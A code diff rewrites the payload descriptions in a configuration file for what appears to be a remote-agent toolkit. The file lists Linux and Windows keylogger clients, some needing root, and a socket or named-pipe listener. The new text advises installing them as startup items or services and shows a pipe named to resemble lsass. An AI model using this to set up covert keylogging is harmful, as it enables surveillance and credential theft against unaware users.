+++ client/payloads.json
@@ -1,7 +1,7 @@
 {
     "linux/privileged": {
-        "type": "Linux With Keylogger",
-        "description": "requires root",
+        "type": "Linux Keylogger",
+        "description": "Must run as root. Keylogger without automatic processing.",
         "os": "linux",
         "code_path": "linux/privileged/client.go",
         "flags": "-trimpath -ldflags",
@@ -12,8 +12,8 @@
         ]
     },
     "linux/keylogger-v2": {
-        "type": "Linux With Keylogger v2",
-        "description": "requires root",
+        "type": "Linux Keylogger v2",
+        "description": "Must run as root. Keylogger with automatic processing.",
         "os": "linux",
         "code_path": "linux/keylogger-v2/client.go",
         "flags": "-trimpath -ldflags",
@@ -24,8 +24,8 @@
         ]
     },
     "linux/socket-listener": {
-        "type": "Keylogger v2 with socket listener",
-        "description": "requires root, has a socket at /var/run/log.sock for custom logs",
+        "type": "Linux Socket Listener",
+        "description": "Requires root, has a socket at /var/run/log.sock for custom logs sent in UTF-8 format. Comes with the Linux Keylogger v2.",
         "os": "linux",
         "code_path": "linux/socket-listener/client.go",
         "flags": "-trimpath -ldflags",
@@ -37,7 +37,7 @@
     },
     "linux/unprivileged": {
         "type": "Linux Original",
-        "description": "linux unprivileged",
+        "description": "Can run as any user. Does not have any keylogger.",
         "os": "linux",
         "code_path": "linux/unprivileged/client.go",
         "flags": "-trimpath -ldflags",
@@ -49,7 +49,7 @@
     },
     "windows/unprivileged": {
         "type": "Windows Original",
-        "description": "windows unprivileged",
+        "description": "Can run as any user. Does not have any keylogger.",
         "os": "windows",
         "code_path": "windows/unprivileged/client.go",
         "flags": "-trimpath -ldflags",
@@ -62,7 +62,7 @@
     },
     "windows/privileged": {
         "type": "Windows Keylogger",
-        "description": "windows keylogger",
+        "description": "Can run as any user. Has a userland keylogger. Recommended to use this as a startup item.",
         "os": "windows",
         "code_path": "windows/privileged/client.go",
         "flags": "-trimpath -ldflags",
@@ -75,8 +75,8 @@
         ]
     },
     "windows/named-pipe": {
-        "type": "Windows keylogger and named pipe",
-        "description": "Windows agent with keylogger and named pipe at \\.\\pipe\\lsass_log",
+        "type": "Windows Named pipe",
+        "description": "Windows agent with keylogger and named pipe at \\.\\pipe\\lsass_log for custom logs sent in UTF-8 format. Recommended to run this as as service.",
         "os": "windows",
         "code_path": "windows/named-pipe/client.go",
         "flags": "-trimpath -ldflags",
